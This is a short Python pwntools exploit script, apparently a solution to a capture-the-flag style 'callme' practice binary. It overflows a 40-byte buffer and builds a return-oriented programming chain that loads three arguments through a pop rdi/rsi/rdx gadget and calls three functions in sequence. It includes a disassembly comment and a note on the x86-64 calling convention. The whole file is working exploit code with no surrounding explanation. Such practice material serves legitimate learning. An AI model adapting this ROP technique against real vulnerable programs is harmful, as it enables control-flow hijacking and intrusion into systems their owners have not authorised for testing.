from pwn import * 


"""

                     j_callme_one:        // callme_one
0000000000401850         jmp        qword [callme_one@GOT]                      ; callme_one, callme_one@GOT, CODE XREF=usefulFunction+59
                        ; endp

"""

"""
On x86-64 Linux, the first six function arguments are passed in registers %rdi, %rsi, %rdx, %rcx, %r8, and %r9, respectively. The seventh and subsequent arguments are passed on the stack, about which more below. The return value is passed in register %rax.
"""

def exploit():

	p = process('./callme')
	#p = gdb.debug('./callme', 'b main')
	context(os='linux', arch='amd64')
	context.log_level = 'DEBUG'

	log.success("[*] Sending Exploit")

	call1 = p64(0x401850)
	call2 = p64(0x401870)
	call3 = p64(0x401810)
	gadget = p64(0x401ab0) # pop rdi ; pop rsi ; pop rdx ; ret

	pwn = "A" * 40 # overflow
	pwn += gadget
	pwn += p64(1)
	pwn += p64(2)
	pwn += p64(3)
	pwn += call1
	pwn += gadget
	pwn += p64(1)
	pwn += p64(2)
	pwn += p64(3)
	pwn += call2
	pwn += gadget
	pwn += p64(1)
	pwn += p64(2)
	pwn += p64(3)
	pwn += call3

	p.recvuntil(">")
	p.sendline(pwn)
	p.interactive()

exploit()